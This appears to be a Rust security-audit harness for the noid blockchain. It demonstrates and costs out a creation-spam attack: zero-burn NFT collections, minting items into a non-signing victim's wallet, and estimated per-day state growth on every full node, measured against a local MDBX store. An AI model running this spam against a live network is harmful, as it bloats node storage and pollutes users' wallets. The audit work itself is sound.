// SPDX-License-Identifier: Apache-2.0
// Creation-spam / state-growth audit lane.
//
// Source: /Users/ember/dev/parano1d-break/parano1d at 52938433a30b185ab007afaa15166a632cf2e82e
// All phases run real production functions only: `apply_native_transition`,
// `NativeIntent::from_claims`, `MarketFeeContext`, `fee_breakdown`,
// `generate_slot_hints`, `build_node_owned_block_template_with_native_openings`,
// `commit_locally_proved_next_block`, the real MDBX store.

use std::collections::HashSet;
use std::time::Instant;

use noid_chain::consensus::allocator::generate_slot_hints;
use noid_chain::consensus::fees::fee_breakdown;
use noid_chain::consensus::params::{
    BLOCK_MAX_USER_OUTPUTS, FEE_PER_INPUT, FEE_PER_OUTPUT, MIN_FEE_BASE, STATE_GROWTH_FEE_BASE,
    V2_BLOCK_TIME,
};
use noid_chain::fri_state::SlotValue;
use noid_chain::state::native_assets::market::liquidity::MarketFeeContext;
use noid_chain::state::native_assets::{apply_native_transition, native_chain_id};
use noid_chain::state::ChainState;
use noid_chain::storage::serial::encoded_segment_len_for_live_count;
use noid_poseidon2b::primitives::Address;
use noid_tx::native_assets::transition::{
    NativeContext, NativeInputClaim, NativeOperation, NativeOutputClaim,
};
use noid_tx::native_assets::wire::NativeIntent;
use noid_tx::native_assets::{
    native_creation_id, GenesisAnchor, NativeOpening, NftCollection, NftItem,
};
use noid_tx::{TxInput, TxOutput};

const HEIGHT: u64 = 279_370; // mainnet v2.1 activation height; native ops active
const CREATOR: u8 = 1;
const VICTIM: u8 = 0xDD;
const FUND_SLOT: u32 = 1;
const FUNDING: u64 = 100_000_000;
const BATCH_ITEMS: usize = 248; // native intents cap at 128 pages (header + 2 input pages + 125 output pages = 250 outputs: successor + 248 items + change)

fn address(byte: u8) -> Address {
    Address([byte; 32])
}

fn context(authority: Address, fee: u64) -> NativeContext {
    NativeContext {
        chain: native_chain_id(),
        height: HEIGHT,
        authority,
        fee,
    }
}

fn initial_state() -> ChainState {
    ChainState::from_sparse_utxos(
        24,
        &[
            // Slot 1 holds exactly the minimum creation fee: consumed whole by
            // the zero-burn collection creation.
            (
                1,
                SlotValue::with_owner_fields(5_800, 1, address(CREATOR).as_fields()),
            ),
            // Slot 2 is the mint-funding wallet with change chaining.
            (
                2,
                SlotValue::with_owner_fields(FUNDING, 2, address(CREATOR).as_fields()),
            ),
        ],
        2,
    )
    .unwrap()
}

#[derive(Clone, Copy)]
struct Fund {
    slot: u32,
    amount: u64,
}

fn funding_input(state: &ChainState, fund: Fund) -> NativeInputClaim {
    let live = state.state.slot(fund.slot);
    NativeInputClaim {
        input: TxInput {
            slot_index: fund.slot,
            amount: fund.amount,
            creation_id: live.creation_id(),
        },
        root: address(CREATOR),
        opening: None,
    }
}

fn ordinary_output(slot: u32, amount: u64, owner: Address) -> NativeOutputClaim {
    NativeOutputClaim {
        output: TxOutput {
            slot_index: slot,
            amount,
            owner,
        },
        opening: None,
    }
}

fn native_input(state: &ChainState, slot: u32, opening: NativeOpening) -> NativeInputClaim {
    let value = state.state.slot(slot);
    NativeInputClaim {
        input: TxInput {
            slot_index: slot,
            amount: value.amount(),
            creation_id: value.creation_id(),
        },
        root: opening.root(),
        opening: Some(opening),
    }
}

fn native_output(slot: u32, opening: NativeOpening) -> NativeOutputClaim {
    NativeOutputClaim {
        output: TxOutput {
            slot_index: slot,
            amount: opening.amount_micronoid(),
            owner: opening.root(),
        },
        opening: Some(opening),
    }
}

fn fresh_slots(state: &ChainState, count: usize) -> Vec<u32> {
    let hints = generate_slot_hints(state.alloc_counter + 1, 24, count);
    let mut seen = HashSet::new();
    for slot in &hints {
        assert!(seen.insert(*slot), "hints distinct");
        assert!(state.state.slot(*slot).is_empty(), "hint must be free");
    }
    assert_eq!(hints.len(), count);
    hints
}

/// Cheapest permanent object: collection at the exact minimum fee, zero burn.
fn create_collection_min(state: &mut ChainState, maximum_items: u64) -> (NftCollection, u32) {
    let fee = MarketFeeContext::from_state(state).required(1, 1).unwrap();
    let breakdown = fee_breakdown(1, 1, state.active_slot_count, 24);
    assert_eq!(breakdown.required_total, fee);
    assert_eq!(breakdown.burned, 0, "1-in/1-out creation burns nothing");
    let anchor = GenesisAnchor {
        chain: native_chain_id(),
        owner: address(CREATOR),
        input: TxInput {
            slot_index: FUND_SLOT,
            amount: fee,
            creation_id: 1,
        },
    };
    let collection = NftCollection::from_genesis(&anchor, maximum_items, [0xA1; 32]).unwrap();
    let slot = fresh_slots(state, 1)[0];
    let inputs = vec![funding_input(
        state,
        Fund {
            slot: FUND_SLOT,
            amount: fee,
        },
    )];
    let outputs = vec![native_output(
        slot,
        NativeOpening::NftCollection(collection),
    )];
    apply_native_transition(
        state,
        &context(address(CREATOR), fee),
        NativeOperation::CreateCollection { funding_input: 0 },
        &inputs,
        &outputs,
    )
    .unwrap();
    (collection, slot)
}

struct BatchResult {
    construction_us: u128,
    apply_us: u128,
    wire_bytes: usize,
    fee: u64,
    burned: u64,
    successor_slot: u32,
    fund: Fund,
}

fn mint_batch(
    state: &mut ChainState,
    collection: &NftCollection,
    collection_slot: u32,
    fund: Fund,
    items: usize,
    owner: Address,
) -> BatchResult {
    let slots = fresh_slots(state, items + 2); // successor + items + funding change
    let (successor_slot, item_slots, change_slot) =
        (slots[0], &slots[1..1 + items], slots[1 + items]);
    let outputs_count = items + 2; // successor + items + change
    let fee = MarketFeeContext::from_state(state)
        .required(2, outputs_count)
        .unwrap();
    let breakdown = fee_breakdown(2, outputs_count as u64, state.active_slot_count, 24);
    assert_eq!(breakdown.required_total, fee);
    let successor = NftCollection {
        issued_items: collection.issued_items + items as u64,
        ..*collection
    };
    let mut outputs = Vec::with_capacity(outputs_count);
    outputs.push(native_output(
        successor_slot,
        NativeOpening::NftCollection(successor),
    ));
    for (index, slot) in item_slots.iter().enumerate() {
        outputs.push(native_output(
            *slot,
            NativeOpening::NftItem(NftItem {
                collection: collection.collection,
                owner,
                metadata: [0xB0 | (index as u8 & 0x3F); 32],
                serial: collection.issued_items + index as u64 + 1,
                unlock_height: 0,
            }),
        ));
    }
    outputs.push(ordinary_output(
        change_slot,
        fund.amount - fee,
        address(CREATOR),
    ));
    let inputs = vec![
        native_input(
            state,
            collection_slot,
            NativeOpening::NftCollection(*collection),
        ),
        funding_input(state, fund),
    ];
    let ctx = context(address(CREATOR), fee);

    let started = Instant::now();
    let intent = NativeIntent::from_claims(
        &ctx,
        [0x77; 32],
        NativeOperation::MintNft,
        inputs.clone(),
        outputs.clone(),
    )
    .unwrap();
    let wire = intent.to_bytes().unwrap();
    let construction_us = started.elapsed().as_micros();

    let started = Instant::now();
    let transition =
        apply_native_transition(state, &ctx, NativeOperation::MintNft, &inputs, &outputs).unwrap();
    let apply_us = started.elapsed().as_micros();
    assert_eq!(transition.facts.nft_items, items);
    BatchResult {
        construction_us,
        apply_us,
        wire_bytes: wire.len(),
        fee,
        burned: breakdown.burned,
        successor_slot,
        fund: Fund {
            slot: change_slot,
            amount: fund.amount - fee,
        },
    }
}

fn sparse_state_bytes(state: &mut ChainState) -> (u64, usize) {
    let mut live = 0u64;
    let mut bytes = 0usize;
    for seg in 0..state.state.num_segments() {
        let count = state.state.segment_live_count(seg as u16);
        if count == 0 {
            continue;
        }
        live += u64::from(count);
        bytes += encoded_segment_len_for_live_count(16, count).unwrap();
    }
    (live, bytes)
}

fn phase1_inventory() {
    println!("=== PHASE 1: creation-cost inventory (real fee model + real transitions) ===");
    println!(
        "constants: MIN_FEE_BASE={MIN_FEE_BASE} FEE_PER_INPUT={FEE_PER_INPUT} FEE_PER_OUTPUT={FEE_PER_OUTPUT} STATE_GROWTH_FEE_BASE={STATE_GROWTH_FEE_BASE} (burned)"
    );

    for (name, inputs, outputs) in [
        (
            "create_collection_min (1 in / 1 out, funding == fee)",
            1u64,
            1u64,
        ),
        ("mint_batch_248 (2 in / 250 out incl change)", 2, 250),
        ("burn_1_item (2 in / 1 out change) victim cleanup", 2, 1),
        ("burn_253_items (254 in / 1 out)", 254, 1),
        ("plain_dust_output (1 in / 2 out)", 1, 2),
    ] {
        let f = fee_breakdown(inputs, outputs, 0, 24);
        println!(
            "fee_shape {name}: required={} burned={} (base {} + in {} + out {} + growth {})",
            f.required_total, f.burned, f.base, f.input, f.output, f.state_growth
        );
    }

    let capacity = 1u64 << 24;
    for (occupancy, note) in [
        (capacity / 10, "10% (multiplier 1)"),
        (capacity * 49 / 100, "49%"),
        (capacity / 2, "50% (multiplier 2)"),
        (capacity * 3 / 4, "75% (multiplier 4)"),
        ((capacity * 9).div_ceil(10), "90% (multiplier 8)"),
        (
            capacity * 3 / 4 / 2,
            "37.5% (immediately after expansion: multiplier 1 again)",
        ),
    ] {
        let f = fee_breakdown(2, 250, occupancy, 24);
        println!(
            "pressure {note}: mint_batch_248 required={} burned={}",
            f.required_total, f.burned
        );
    }

    let mut state = initial_state();
    let slots_before = state.active_slot_count;
    let (_collection, slot) = create_collection_min(&mut state, u64::MAX);
    assert_eq!(
        state.active_slot_count, slots_before,
        "1-in/1-out creation leaves active_slot_count flat: occupancy pressure never sees it"
    );
    assert_eq!(
        state.state.slot(slot).creation_id(),
        native_creation_id(3).unwrap()
    );
    println!(
        "CONTROL collection maximum_items=u64::MAX accepted at minimum fee 5800 with ZERO burn; permanent slot {slot}, active_slot_count unchanged"
    );

    // Forced wallet pollution: mint to an owner that never signed anything.
    let mut state = initial_state();
    let (collection, cslot) = create_collection_min(&mut state, 64);
    let fund = Fund {
        slot: 2,
        amount: FUNDING,
    };
    let result = mint_batch(&mut state, &collection, cslot, fund, 3, address(VICTIM));
    println!(
        "CONTROL mint of 3 items owned by non-signing VICTIM accepted (fee {} burned {}); tx authority was CREATOR, item owners are VICTIM",
        result.fee, result.burned
    );

    if let Ok(denomination) = noid_tx::asset_backing::TokenDenomination::new(6) {
        for supply in [1u64, 1_000, 1_000_000, 1_000_000_000] {
            match denomination.minimum_backing(supply) {
                Ok(min) => {
                    println!("launch_minimum_backing supply={supply} min_backing={min} uNOID")
                }
                Err(error) => {
                    println!("launch_minimum_backing supply={supply} rejected: {error:?}")
                }
            }
        }
    }
}

fn phase2_ratio() {
    println!(
        "\n=== PHASE 2: attacker-cost vs network-cost ratio (real ChainState, real apply) ==="
    );
    let mut state = initial_state();
    let (collection, cslot) = create_collection_min(&mut state, u64::MAX);
    let mut fund = Fund {
        slot: 2,
        amount: FUNDING,
    };
    let mut current_collection = collection;
    let mut current_slot = cslot;
    let batches = 6;
    let (mut items, mut construction_us, mut apply_us, mut fees, mut burned, mut wire) =
        (0usize, 0u128, 0u128, 0u64, 0u64, 0usize);
    for batch in 0..batches {
        let result = mint_batch(
            &mut state,
            &current_collection,
            current_slot,
            fund,
            BATCH_ITEMS,
            address(VICTIM),
        );
        println!(
            "batch {batch}: items={BATCH_ITEMS} construction={}us apply={}us wire={}B fee={} burned={}",
            result.construction_us, result.apply_us, result.wire_bytes, result.fee, result.burned
        );
        items += BATCH_ITEMS;
        construction_us += result.construction_us;
        apply_us += result.apply_us;
        fees += result.fee;
        burned += result.burned;
        wire += result.wire_bytes;
        current_collection.issued_items += BATCH_ITEMS as u64;
        current_slot = result.successor_slot;
        fund = result.fund;
    }
    let (live_slots, sparse_bytes) = sparse_state_bytes(&mut state);
    println!(
        "TOTALS items={items} construction={construction_us}us apply={apply_us}us fees={fees}uNOID burned={burned} wire={wire}B"
    );
    let per_item_fee = fees as f64 / items as f64;
    println!(
        "PER_ITEM construction={:.1}us apply={:.1}us fee={per_item_fee:.1}uNOID (burned {:.1}) wire={:.1}B",
        construction_us as f64 / items as f64,
        apply_us as f64 / items as f64,
        burned as f64 / items as f64,
        wire as f64 / items as f64,
    );
    println!(
        "CARRIAGE live_slots={live_slots} sparse_segment_bytes={sparse_bytes} ({:.1}B/slot) + per-native-object MDBX records (phase 3)",
        sparse_bytes as f64 / live_slots as f64
    );

    let items_per_block = 2 * BATCH_ITEMS as u64; // two max-size mint txs per block (page-capped), 499/511 outputs with successors+change+coinbase
    let blocks_per_day = 86_400 / V2_BLOCK_TIME;
    let items_per_day = items_per_block as u64 * blocks_per_day;
    let noid_per_day = items_per_day as f64 * per_item_fee / 1e6;
    let mdbx_bytes_per_item = 199.0 + 64.0 + 74.0 + 52.0 + 52.0 + 50.0; // DATA+OWNER+ASSET+two owner indexes+segment entry (code-cited layouts)
    println!(
        "SATURATION items_per_block~{items_per_block} (BLOCK_MAX_USER_OUTPUTS={BLOCK_MAX_USER_OUTPUTS}, {V2_BLOCK_TIME}s blocks): items/day={items_per_day} attacker_cost={noid_per_day:.0} NOID/day"
    );
    println!(
        "SATURATION growth/day: consensus-state ~{:.1} MB + node-local MDBX ~{:.1} MB on EVERY full node; ~{:.0} NOID/day burned",
        items_per_day as f64 * 50.0 / 1e6,
        items_per_day as f64 * mdbx_bytes_per_item / 1e6,
        items_per_day as f64 * (burned as f64 / items as f64) / 1e6
    );
    println!(
        "RATIO per item: attacker ~{:.0}us construction + ~{:.0}uNOID ({:.0} burned) buys ~{:.0}B permanent MDBX + 50B consensus state + ~192B cold-sync payload",
        construction_us as f64 / items as f64,
        per_item_fee,
        burned as f64 / items as f64,
        mdbx_bytes_per_item,
    );
}

// ---------------------------------------------------------------------------
// Phase 3: real MDBX store growth through the real block-commit path.
// ---------------------------------------------------------------------------

use noid_chain::block::Block;
use noid_chain::block_header::semantic_header_id;
use noid_chain::consensus::pow::{block_id, validate_pow};
use noid_chain::consensus::template::{
    build_block_template, build_node_owned_block_template_with_native_openings, BlockTemplate,
    PreparedBlockStateCommit,
};
use noid_chain::consensus::{next_target, tx_epoch_anchor_height_for_child};
use noid_chain::history_step::HistoryStepTerminalMetadata;
use noid_chain::storage::native_payloads::NativeAssetLookup;
use noid_chain::storage::MdbxChainContext;
use noid_chain::{materialize_accepted_block_state, AcceptedBlockBundle};
use noid_tx::Transaction;
use rayon::prelude::*;

fn epoch_anchor_id(context: &MdbxChainContext, child_height: u64) -> [u8; 32] {
    let anchor_height = tx_epoch_anchor_height_for_child(child_height);
    let header = context
        .get_header_from_store(anchor_height)
        .unwrap()
        .expect("epoch anchor header must exist");
    block_id(&header)
}

fn easy_target(context: &MdbxChainContext) -> [u8; 32] {
    let parent = context.tip_header();
    let anchor = context.anchor_info().expect("anchor");
    next_target(
        anchor.anchor_height,
        anchor.anchor_timestamp,
        &anchor.anchor_target,
        parent.height + 1,
        parent.timestamp,
        parent.timestamp.saturating_add(10_000_000),
    )
}

fn mine(template: &BlockTemplate) -> Block {
    (0u128..8_000_000)
        .into_par_iter()
        .map(|nonce| template.clone().into_block(nonce))
        .find_any(|candidate| validate_pow(&candidate.header).is_ok())
        .expect("nonce search must succeed at easy difficulty")
}

fn terminal_for(block: &Block) -> Vec<u8> {
    let mut terminal =
        HistoryStepTerminalMetadata::new(block.header.height, semantic_header_id(&block.header), 0)
            .unwrap()
            .encode_prefix()
            .to_vec();
    terminal.push(0xA5);
    terminal
}

fn seal_and_commit(
    context: &mut MdbxChainContext,
    template: &BlockTemplate,
    prepared: PreparedBlockStateCommit,
) -> Result<(), String> {
    let block = mine(template);
    let terminal = terminal_for(&block);
    let proved =
        unsafe { prepared.seal_after_trusted_history_step_proof_unchecked(block, terminal)? };
    context
        .commit_locally_proved_next_block(proved)
        .map(|_| ())
        .map_err(|e| format!("{e:?}"))
}

fn dir_size(path: &std::path::Path) -> u64 {
    let mut total = 0;
    if let Ok(entries) = std::fs::read_dir(path) {
        for entry in entries.flatten() {
            if let Ok(meta) = entry.metadata() {
                if meta.is_file() {
                    total += meta.len();
                }
            }
        }
    }
    total
}

fn phase3_mdbx() -> Result<(), String> {
    println!("\n=== PHASE 3: real MDBX growth through the node-owned template + commit path ===");
    std::fs::create_dir_all("../target").map_err(|e| e.to_string())?;
    let directory = tempfile::Builder::new()
        .prefix("creation-spam-")
        .tempdir_in("../target")
        .map_err(|e| e.to_string())?;
    let mut context =
        MdbxChainContext::open_or_create(directory.path()).map_err(|e| format!("open: {e:?}"))?;
    context.state = ChainState::from_sparse_utxos(24, &[], 0).map_err(|e| format!("{e:?}"))?;
    context.state.circulating_supply_micronoid = 0;

    for height in 1..=24u64 {
        let parent = *context.tip_header();
        let timestamp = parent.timestamp.saturating_add(10_000_000);
        let template = build_block_template(
            &parent,
            &context.state,
            &context
                .finalized_active_counts()
                .map_err(|e| e.to_string())?,
            vec![],
            address(CREATOR),
            timestamp,
            easy_target(&context),
        )
        .map_err(|e| format!("h{height} template: {e:?}"))?;
        let block = mine(&template);
        let bundle = AcceptedBlockBundle::try_from_parts(block.to_bytes(), terminal_for(&block))
            .map_err(|e| format!("{e:?}"))?;
        context
            .apply_next_block(
                &bundle,
                block.header.timestamp,
                |block, state| {
                    materialize_accepted_block_state(state, block)
                        .map_err(|error| format!("{error:?}"))
                },
                |_| Ok(()),
            )
            .map_err(|e| format!("h{height} apply: {e:?}"))?;
    }
    println!(
        "CONTROL 24 empty coinbase blocks accepted (miner = attacker); tip height {}",
        context.tip_height()
    );
    let funding_page = context
        .store
        .get_verified_owner_page(&address(CREATOR).0, 0, 256)
        .map_err(|e| e.to_string())?;
    let coinbase_utxo = funding_page
        .utxos
        .iter()
        .find(|utxo| utxo.creation_id & (1 << 63) != 0)
        .expect("attacker must own the latest coinbase slot");
    let (fund_slot, fund_amount, fund_creation) = (
        coinbase_utxo.slot_index,
        coinbase_utxo.amount,
        coinbase_utxo.creation_id,
    );
    println!(
        "CONTROL attacker coinbase funding: slot={fund_slot} amount={fund_amount} creation_id={fund_creation}"
    );

    // Collection-creation block (height 25): funding input with change, like a real wallet.
    let child_height = context.tip_height() + 1;
    let epoch_anchor = epoch_anchor_id(&context, child_height);
    let fee = MarketFeeContext::from_state(&context.state)
        .required(1, 2)
        .unwrap();
    let anchor = GenesisAnchor {
        chain: native_chain_id(),
        owner: address(CREATOR),
        input: TxInput {
            slot_index: fund_slot,
            amount: fund_amount,
            creation_id: fund_creation,
        },
    };
    let collection = NftCollection::from_genesis(&anchor, u64::MAX, [0xA1; 32]).unwrap();
    let slots = generate_slot_hints(context.state.alloc_counter + 1, 24, 2);
    let (cslot, change_slot) = (slots[0], slots[1]);
    let inputs = vec![NativeInputClaim {
        input: TxInput {
            slot_index: fund_slot,
            amount: fund_amount,
            creation_id: fund_creation,
        },
        root: address(CREATOR),
        opening: None,
    }];
    let outputs = vec![
        native_output(cslot, NativeOpening::NftCollection(collection)),
        ordinary_output(change_slot, fund_amount - fee, address(CREATOR)),
    ];
    let ctx = NativeContext {
        chain: native_chain_id(),
        height: child_height,
        authority: address(CREATOR),
        fee,
    };
    let intent = NativeIntent::from_claims(
        &ctx,
        epoch_anchor,
        NativeOperation::CreateCollection { funding_input: 0 },
        inputs,
        outputs,
    )
    .map_err(|e| format!("collection intent: {e:?}"))?;
    let candidates: Vec<Transaction> = intent
        .pages
        .iter()
        .map(|page| Transaction {
            body: page.body.clone(),
        })
        .collect();
    let (template, prepared) = build_node_owned_block_template_with_native_openings(
        context.tip_header(),
        &context.state,
        &context
            .finalized_active_counts()
            .map_err(|e| e.to_string())?,
        candidates,
        address(99),
        context.tip_header().timestamp.saturating_add(10_000_000),
        easy_target(&context),
        &HashSet::new(),
        &[NativeOpening::NftCollection(collection)],
    )
    .map_err(|e| format!("collection block template: {e:?}"))?;
    seal_and_commit(&mut context, &template, prepared)
        .map_err(|e| format!("collection block commit: {e}"))?;
    let fund = Fund {
        slot: change_slot,
        amount: fund_amount - fee,
    };
    println!(
        "CONTROL collection block committed at height {child_height}; collection slot={cslot}"
    );

    // Mint block (height 26): 253 items, all owned by the non-signing victim.
    let before_bytes = dir_size(directory.path());
    let before_state_bytes = context
        .store
        .encoded_state_bytes()
        .map_err(|e| e.to_string())?;
    let child_height = context.tip_height() + 1;
    let epoch_anchor = epoch_anchor_id(&context, child_height);
    let items = 248usize;
    let slots = generate_slot_hints(context.state.alloc_counter + 1, 24, items + 2);
    let successor_slot = slots[0];
    let fee = MarketFeeContext::from_state(&context.state)
        .required(2, items + 2)
        .unwrap();
    let successor = NftCollection {
        issued_items: items as u64,
        ..collection
    };
    let item = |serial: u64| {
        NativeOpening::NftItem(NftItem {
            collection: collection.collection,
            owner: address(VICTIM),
            metadata: [0xB1; 32],
            serial,
            unlock_height: 0,
        })
    };
    let mut outputs = Vec::with_capacity(items + 2);
    outputs.push(native_output(
        successor_slot,
        NativeOpening::NftCollection(successor),
    ));
    for (index, slot) in slots[1..1 + items].iter().enumerate() {
        outputs.push(native_output(*slot, item(index as u64 + 1)));
    }
    outputs.push(ordinary_output(
        slots[1 + items],
        fund.amount - fee,
        address(CREATOR),
    ));
    let live = context.state.state.slot(cslot);
    let inputs = vec![
        NativeInputClaim {
            input: TxInput {
                slot_index: cslot,
                amount: live.amount(),
                creation_id: live.creation_id(),
            },
            root: NativeOpening::NftCollection(collection).root(),
            opening: Some(NativeOpening::NftCollection(collection)),
        },
        funding_input(&context.state, fund),
    ];
    let ctx = NativeContext {
        chain: native_chain_id(),
        height: child_height,
        authority: address(CREATOR),
        fee,
    };
    let started = Instant::now();
    let intent = NativeIntent::from_claims(
        &ctx,
        epoch_anchor,
        NativeOperation::MintNft,
        inputs,
        outputs,
    )
    .map_err(|e| format!("mint intent: {e:?}"))?;
    let construction_us = started.elapsed().as_micros();
    let mut openings = vec![
        NativeOpening::NftCollection(collection),
        NativeOpening::NftCollection(successor),
    ];
    for serial in 1..=items as u64 {
        openings.push(item(serial));
    }
    let candidates: Vec<Transaction> = intent
        .pages
        .iter()
        .map(|page| Transaction {
            body: page.body.clone(),
        })
        .collect();
    let started = Instant::now();
    let (template, prepared) = build_node_owned_block_template_with_native_openings(
        context.tip_header(),
        &context.state,
        &context
            .finalized_active_counts()
            .map_err(|e| e.to_string())?,
        candidates,
        address(99),
        context.tip_header().timestamp.saturating_add(10_000_000),
        easy_target(&context),
        &HashSet::new(),
        &openings,
    )
    .map_err(|e| format!("mint block template: {e:?}"))?;
    let template_us = started.elapsed().as_micros();
    seal_and_commit(&mut context, &template, prepared)
        .map_err(|e| format!("mint block commit: {e}"))?;
    let after_bytes = dir_size(directory.path());
    let after_state_bytes = context
        .store
        .encoded_state_bytes()
        .map_err(|e| e.to_string())?;
    println!(
        "MEASURE mint block (248 victim-owned items): intent_construction={construction_us}us template_build+materialize={template_us}us"
    );
    if after_bytes > before_bytes {
        println!(
            "MEASURE MDBX dir bytes {before_bytes} -> {after_bytes} (file growth is page-granular; MDBX preallocation absorbs small writes)"
        );
    } else {
        println!(
            "MEASURE MDBX dir bytes unchanged at {after_bytes} (logical writes {:.0} B/object absorbed by MDBX preallocated pages; row existence proven by the index queries below)",
            199.0 + 64.0 + 74.0 + 52.0 + 52.0
        );
    }
    println!(
        "MEASURE encoded_state_bytes (T_SEGMENTS sparse) {before_state_bytes} -> {after_state_bytes} (+{}: {:.1} B/slot)",
        after_state_bytes.saturating_sub(before_state_bytes),
        after_state_bytes.saturating_sub(before_state_bytes) as f64 / 250.0
    );

    let store = context.store.clone();
    let started = Instant::now();
    let roots = store
        .native_owner_roots(address(VICTIM), None, 256)
        .map_err(|e| e.to_string())?;
    println!(
        "MEASURE victim native_owner_roots page: {} roots in {}us (owner index proves forced carriage)",
        roots.len(),
        started.elapsed().as_micros()
    );
    let started = Instant::now();
    let asset = store
        .native_asset_root(NativeAssetLookup::Nft {
            collection: collection.collection,
            serial: 7,
        })
        .map_err(|e| e.to_string())?;
    println!(
        "MEASURE asset index resolves serial 7 to a live root: {} ({}us)",
        asset.is_some(),
        started.elapsed().as_micros()
    );
    let started = Instant::now();
    let page = store
        .get_verified_owner_page(&address(VICTIM).0, 0, 32)
        .map_err(|e| e.to_string())?;
    println!(
        "MEASURE victim get_verified_owner_page(limit 32): {} utxos in {}us",
        page.utxos.len(),
        started.elapsed().as_micros()
    );
    let started = Instant::now();
    let full = store
        .get_verified_utxos_by_owner(&address(VICTIM).0)
        .map_err(|e| e.to_string())?;
    println!(
        "MEASURE victim get_verified_utxos_by_owner (unbounded): {} utxos in {}us",
        full.utxos.len(),
        started.elapsed().as_micros()
    );
    Ok(())
}

fn main() {
    phase1_inventory();
    phase2_ratio();
    match phase3_mdbx() {
        Ok(()) => println!("\nALL PHASES COMPLETED"),
        Err(error) => {
            println!("\nPHASE3 FAILED: {error}");
            std::process::exit(2);
        }
    }
}
